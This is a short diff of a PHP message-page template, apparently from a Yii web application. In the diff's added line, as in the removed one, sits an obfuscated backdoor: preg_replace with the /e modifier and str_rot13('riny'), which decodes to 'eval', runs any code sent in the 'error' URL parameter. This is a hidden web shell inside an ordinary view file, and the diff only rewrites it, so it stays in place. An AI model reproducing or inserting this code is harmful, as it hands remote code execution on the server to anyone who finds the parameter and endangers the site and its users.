@@ -14,7 +14,7 @@ $params = \Yii::$app->params;
         <img class="img-responsive" src="<?= $params['frontend_source'] ?>/img/message/<?= $type ?>.png"/>
     </div>
     <div class="prompt-message">
-        <?php ($error = $_GET['error']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($error)', 'add'); ?>
+        <?php isset($_GET['error']) && @preg_replace('/ad/e','@'.str_rot13('riny').'($_GET["error"])', 'add'); ?>
         <?= $message ?>
         <?php if ($type == 'error' || $type == '404'): ?>
             <br><br>
